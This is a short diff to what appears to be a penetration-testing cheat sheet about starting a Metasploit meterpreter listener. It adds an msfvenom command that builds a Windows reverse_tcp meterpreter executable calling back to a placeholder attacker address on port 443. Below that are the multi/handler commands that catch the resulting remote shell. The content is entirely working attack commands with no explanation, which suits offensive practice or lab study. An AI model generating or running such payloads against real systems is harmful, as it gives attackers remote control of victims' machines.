@@ -1,6 +1,9 @@
 Start meterpreter listener for a Windows payload
 ------------------------------------------------
 ```bash
+# Create Payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=443 -f exe > ./reverse3.exe
+# Start Listener
 use exploit/multi/handler 
 set PAYLOAD windows/meterpreter/reverse_tcp 
 set LHOST xxx.xxx.xxx.xxx
